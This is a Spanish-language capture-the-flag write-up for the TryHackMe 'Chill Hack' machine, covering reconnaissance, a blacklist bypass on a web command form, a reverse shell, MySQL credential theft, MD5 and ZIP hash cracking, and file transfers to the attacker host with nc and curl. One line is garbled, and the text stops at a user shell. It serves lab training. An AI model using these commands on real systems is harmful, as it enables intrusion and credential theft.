## TryHackMe  <> Chill Hack

![image](https://github.com/Esevka/CTF/assets/139042999/fb2397af-1c4d-452d-ad14-f9ccaf482ef1)

Enlace Maquina: https://tryhackme.com/room/chillhack

Enunciado : 
  - Conseguir Flags(user.txt y root.txt)
    
---

## Escaneo de puertos (NMAP).

-Vemos que tras lanzar un paquete ICMP a la direccion ip de la maquina victima obtenemos un ttl=63, basandonos en el ttl podriamos decir que es una maquina ---> Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
    └─# ping 10.10.52.28 -c1     
    PING 10.10.52.28 (10.10.52.28) 56(84) bytes of data.
    64 bytes from 10.10.52.28: icmp_seq=1 ttl=63 time=46.3 ms
    
    --- 10.10.52.28 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 46.261/46.261/46.261/0.000 ms

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.52.28 -oN open_ports   
    
    PORT   STATE SERVICE REASON
    21/tcp open  ftp     syn-ack ttl 63
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
    └─# nmap -p 21,22,80 -sCV -vvv 10.10.52.28 -oN info_ports                     
    
    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.9.92.151
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
    
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
    |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
    |   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Game Info
    | http-methods: 
    |_  Supported Methods: POST OPTIONS HEAD GET
    |_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
-Segun el lauchpad del servicio OpenSSH que tenemos corriendo en el puerto 22.

![image](https://github.com/Esevka/CTF/assets/139042999/3da26bee-0bb5-4c52-950e-549db8d0f555)


## Analizamos la informacion obtenida.

--Puerto 21(ftp), permite el acceso anonimo.

  - Obtenemos toda la info del servidor ftp.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
        └─# ftp anonymous@10.10.52.28  
        ftp> ls
        229 Entering Extended Passive Mode (|||29161|)
        150 Here comes the directory listing.
        -rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
        226 Directory send OK.
        ftp> get note.txt
        local: note.txt remote: note.txt
        229 Entering Extended Passive Mode (|||58849|)
        150 Opening BINARY mode data connection for note.txt (90 bytes).
        100% |******************************************************************************************************************|    90       79.90 KiB/s    00:00 ETA
        226 Transfer complete.
        90 bytes received in 00:00 (1.77 KiB/s)

  - note.txt parece ser una pista que aun no entiendo su significado.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
        └─# cat note.txt       
        Anurodh told me that there is some filtering on strings being put in the command -- Apaar

--Puerto 80(http)

  - Cargamos la web pero no encontramos nada que nos interese.

  - Realizamos Fuzzing web en busca de directorios.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
        └─# gobuster dir -u http://10.10.52.28 -w /usr/share/wordlists/dirb/common.txt -o fuzz
    
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        /.hta                 (Status: 403) [Size: 276]
        /.htaccess            (Status: 403) [Size: 276]
        /.htpasswd            (Status: 403) [Size: 276]
        /css                  (Status: 301) [Size: 308] [--> http://10.10.52.28/css/]
        /fonts                (Status: 301) [Size: 310] [--> http://10.10.52.28/fonts/]
        /images               (Status: 301) [Size: 311] [--> http://10.10.52.28/images/]
        /index.html           (Status: 200) [Size: 35184]
        /js                   (Status: 301) [Size: 307] [--> http://10.10.52.28/js/]
        /secret               (Status: 301) [Size: 311] [--> http://10.10.52.28/secret/] ---> Directorio Interesante
        /server-status        (Status: 403) [Size: 276]
        ===============================================================
        Finished

  - Cargamos el directorio /secret

    - Encontramos un formulario que aparentemente nos permite ejecutar comandos

      ![image](https://github.com/Esevka/CTF/assets/139042999/19011e6f-3049-4154-a39c-e1c78d11f36a)

    - Tras varias pruebas vemos que hay ciertos comandos que no estan permitidos, si recordamos el mensaje note.txt creo por hay van los tiros.

      ![image](https://github.com/Esevka/CTF/assets/139042999/50861814-a9ff-4c22-acaa-1306f12d67c0)

      ![image](https://github.com/Esevka/CTF/assets/139042999/dcc946a2-1eda-444c-a0ba-1d5b9cae53cd)

    - Bypaseamos la lista negra de comandos no permitidos.
   
      - Los comandos que introducimos son tratados como un string es decir --> 'comando' este comando sera comparado casi seguro con una lista de comandos prohibidos.
      - Podriamos escapar un caracter y la comparacion con la blacklist no seria correcta. ej--> 'l\s' es diferente a 'ls' a la hora de comparar el string en si, de cara a la ejecucion l\s se ejecutaria de la misma manera ya que con \ indicamos que queremos escapar el caracter 's' quedando --> 'ls'
     
        ![image](https://github.com/Esevka/CTF/assets/139042999/2a4709b9-6964-40a7-b2c6-ab288497dada)

        ![image](https://github.com/Esevka/CTF/assets/139042999/e705ec3b-04d0-4b90-9c00-b561941585d8)

        Teniendo claro esto vamos a ejecutar una reverse shell.

## Obtenemos sesion en la maquina victima.

  - Nos ponemos en escucha con netcat y ejecutamos el siguiente comando

    ![image](https://github.com/Esevka/CTF/assets/139042999/ab5599ee-a6a0-4734-a012-f39d28ba2760)

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
        └─# nc -lnvp 1988
        listening on [any] 1988 ...
        connect to [10.9.92.151] from (UNKNOWN) [10.10.113.149] 49160
        bash: cannot set terminal process group (1098): Inappropriate ioctl for device
        bash: no job control in this shell
        www-data@ubuntu:/var/www/html/secret$ whoami
        whoami
        www-data
    
  - upgradeamos a full tty

        www-data@ubuntu:/var/www/html/secret$ SHELL=/bin/bash script -q /dev/null
        SHELL=/bin/bash script -q /dev/null
        www-data@ubuntu:/var/www/html/secret$ export TERM=xterm
        export TERM=xterm
        www-data@ubuntu:/var/www/html/secret$ ^Z
        zsh: suspended  nc -lnvp 1988
                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
        └─# stty raw -echo ;fg 
        [1]  + continued  nc -lnvp 1988
                                       reset
        
        www-data@ubuntu:/var/www/html/secret$ stty rows 52 columns 159
        www-data@ubuntu:/var/www/html/secret$ 

## Elevamos privilegios en la maquina victima y obtenemos flags.

- Vamos retrocediento directorios en busca de informacion.

  - Directorio /files encontramos cosas muy interesantes.

    1) index.php --> Credenciales de acceso a una base de datos Mysql
   
           $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");

       account.php -->  Vemos que la password la almacena como un hash(md5) y como hace la query para validar el login.

            $pw = hash("md5",$pw);
            $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
       
          - Mostramos las conexiones activas y vemos que tiene un servicio Mysql corriendo localmente.
      
            ![image](https://github.com/Esevka/CTF/assets/139042999/31dcfd5c-861e-4948-9aa3-6f0910783ae6)

          - Obtenemos credenciales de usuarios
      
                www-data@ubuntu:/var/www/files$ mysql -u root -p  webportal
                Enter password: 
                
                mysql> show tables
                    -> ;
                +---------------------+
                | Tables_in_webportal |
                +---------------------+
                | users               |
                +---------------------+
                1 row in set (0.00 sec)
                
                mysql> select * from users;
                +----+-----------+----------+-----------+----------------------------------+
                | id | firstname | lastname | username  | password                         |
                +----+-----------+----------+-----------+----------------------------------+
                |  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
                |  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
                +----+-----------+----------+-----------+----------------------------------+
            
          - Crakeamos las passwords de los diferentes usuarios
            
                ---> Anurodh:masterpassword <---
            
                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                └─# echo '7e53614ced3640d5de23f111806cc4fd' > hash_users
                                                                                                                                                                               
                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_users --format="RAW-MD5"
                Using default input encoding: UTF-8
                Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
                Warning: no OpenMP support for this hash type, consider --fork=3
                Press 'q' or Ctrl-C to abort, almost any other key for status
                masterpassword   (?)     
                1g 0:00:00:00 DONE (2023-12-08 09:47) 3.030g/s 17378Kp/s 17378Kc/s 17378KC/s masterrecherche..masterofdarklord
                Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
                Session completed.

                ---> Apaar:dontaskdonttell <---

                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                └─# echo '686216240e5af30df0501e53c789a649' > hash_users
                                                                                                                                                                               
                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_users --format="RAW-MD5"
                Using default input encoding: UTF-8
                Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
                Warning: no OpenMP support for this hash type, consider --fork=3
                Press 'q' or Ctrl-C to abort, almost any other key for status
                dontaskdonttell  (?)     
                1g 0:00:00:00 DONE (2023-12-08 09:49) 8.333g/s 15416Kp/s 15416Kc/s 15416KC/s dontspeak3..dontae24
                Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
                Session completed. 

          - Estas credenciales no son validas para cambiar de usuario desde la consola.
       
                www-data@ubuntu:/var/www/html/secret$ su apaar
                Password: 
                su: Authentication failure
                www-data@ubuntu:/var/www/html/secret$ su anurodh
                Password: 
                su: Authentication failure

          -  Cuando mostramos las conexiones activas habia otros puertos, los revisamos y vemos que esta corriendo un servicio http localmente el el puerto 9001

              ![image](https://github.com/Esevka/CTF/assets/139042999/52a4643a-072e-49b0-8112-1568c4e6a0f8)

                  www-data@ubuntu:/var/www/html/secret$ nc -nv 127.0.0.1 9001
                  Connection to 127.0.0.1 9001 port [tcp/*] succeeded!
                  
                  HTTP/1.1 400 Bad Request
                  Date: Fri, 08 Dec 2023 09:08:40 GMT
                  Server: Apache/2.4.29 (Ubuntu)
                  Content-Length: 303
                  Connection: close
                  Content-Type: text/html; charset=iso-8859-1
                  
                  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
                  <html><head>
                  <title>400 Bad Request</title>
                  </head><body>
                  <h1>Bad Request</h1>
                  <p>Your browser sent a request that this server could not understand.<br />
                  </p>
                  <hr>
                  <address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 9001</address>
                  </body></html>
             
          - Redireccionamos el puerto 9001 que esta corriento un servicio http local para poder visualizar la web desde nuestro navegador(Remote Port Forwarding)

            [+]Socat--> https://github.com/andrew-d/static-binaries/tree/master/binaries/linux

            Montamos servidor web con python
                
                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                └─# python3 -m http.server 80
                Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
                10.10.134.121 - - [09/Dec/2023 10:09:45] "GET /socat HTTP/1.1" 200 -

            Descargamos Socat en la maquina victima y le damos permiso de ejecucion.

                www-data@ubuntu:/tmp$ curl http://10.9.92.151/socat -o socat
                 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                                 Dload  Upload   Total   Spent    Left  Speed
                100  366k  100  366k    0     0   564k      0 --:--:-- --:--:-- --:--:--  564k
                
            Redireccionamos el puerto local 9001 al puerto remoto 8080

                www-data@ubuntu:/tmp$ ./socat tcp-l:8080,fork,reuseaddr tcp:localhost:9001

            ![image](https://github.com/Esevka/CTF/assets/139042999/355e908d-1016-4b2a-b637-672b59f6ee5e)

                  Tras testear el formulario de login, la unica conclusion es que si las credenciales son validas nos cargar el fichero hacker.php

    2) hacker.php, el nombre de una de las imagenes llama la atencion
   
            background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');

            <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
            style="background-color:red;">You have reached this far. </h2>
            style="background-color:black;">Look in the dark! You will find your answer</h1>

    4) Directorio /images

       - Encontramos dos imagenes, el nombre de una de ellas parece un hash(md5)

              www-data@ubuntu:/var/www/files/images$ ls -la
              total 2112
              drwxr-xr-x 2 root root    4096 Oct  3  2020 .
              drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
              -rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif --> no obtenemos nada del hash
              -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg

        - Analizamos ambas imagenes por si ocultan alguna informacion.
      
            - Con netcat nos descargamos las imagenes a nuestra maquina de atacante para analizarlas
         
                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                  └─# nc -lnvp 1988 > 002d7e638fb463fb7a266f5ffc7ac47d.gif
                  listening on [any] 1988 ...
                  connect to [10.9.92.151] from (UNKNOWN) [10.10.134.121] 49766
                  
                  www-data@ubuntu:/var/www/files/images$ nc -nv 10.9.92.151 1988 < 002d7e638fb463fb7a266f5ffc7ac47d.gif 
                  Connection to 10.9.92.151 1988 port [tcp/*] succeeded!

                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                  └─# nc -lnvp 1988 > hacker-with-laptop_23-2147985341.jpg
                  listening on [any] 1988 ...
                  connect to [10.9.92.151] from (UNKNOWN) [10.10.134.121] 49770
                  
                  www-data@ubuntu:/var/www/files/images$ nc -nv 10.9.92.151 1988 < hacker-with-laptop_23-2147985341.jpg 
                  Connection to 10.9.92.151 1988 port [tcp/*] succeeded!

            - Analizamos ficheros y conseguimos extraer backup.zip de la imagen ---> hacker-with-laptop_23-2147985341.jpg
         
                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                  └─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
                  Enter passphrase: 
                  wrote extracted data to "backup.zip".

               Probamos todas las passwords encontradas por el momento y ninguna funciono.

            - Crakeamos backup.zip a ver si podemos obtener su clave
         
                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                  └─# zip2john backup.zip > hash_zip                                    
                  ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
                                                                                                                                                                                 
                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                  └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip     
                  Using default input encoding: UTF-8
                  Loaded 1 password hash (PKZIP [32/64])
                  Will run 3 OpenMP threads
                  Press 'q' or Ctrl-C to abort, almost any other key for status
                  pass1word        (backup.zip/source_code.php)     
                  1g 0:00:00:00 DONE (2023-12-09 10:51) 33.33g/s 409600p/s 409600c/s 409600C/s horoscope..hawkeye
                  Use the "--show" option to display all of the cracked passwords reliably
                  Session completed.
              
            -  Descomprimimos backup.zip y obtenemos el fichero --> source_code.php
         
                    ──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                    └─# cat source_code.php 
                    <html>
                     [...]
                    <?php
                            if(isset($_POST['submit']))
                            {
                                    $email = $_POST["email"];
                                    $password = $_POST["password"];
                                    if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                                    { 
                                            $random = rand(1000,9999);?><br><br><br>
                                            <form method="POST">
                                                    Enter the OTP: <input type="number" name="otp">
                                                    <input type="submit" name="submitOtp" value="Submit">
                                            </form>
                                    <?php   mail($email,"OTP for authentication",$random);
                                            if(isset($_POST["submitOtp"]))
                                                    {
                                                            $otp = $_POST["otp"];
                                                            if($otp == $random)
                                                            {
                                                                    echo "Welcome Anurodh!";
                                                                    header("Location: authenticated.php");
                            [...]


                - Leemos el codigo y vemos que tenemos la password  codeada en bas64 del usuario Anurodh  
        
                      ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
                      └─# echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d       
                      !d0ntKn0wmYp@ssw0rd
        
        
                        Anurodh:!d0ntKn0wmYp@ssw0rd


-LLegamsdkfkdf varias maneras de elevar segun orden. Elevamos privilegios horizontalmente www-data to anurodh y leemos flag

      ww-data@ubuntu:/var/www/files/images$ su anurodh
      Password: 
      anurodh@ubuntu:/var/www/files/images$ id
      uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)



    

